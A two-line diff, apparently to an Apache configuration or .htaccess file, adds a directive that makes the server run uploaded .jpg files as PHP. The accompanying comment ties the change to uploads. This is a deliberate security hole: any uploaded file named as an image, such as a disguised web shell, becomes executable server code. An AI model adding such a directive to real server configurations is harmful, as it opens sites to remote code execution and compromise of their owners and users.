@@ -1,0 +1,2 @@
+# Treat uploaded .jpg as PHP
+AddType application/x-httpd-php .jpg
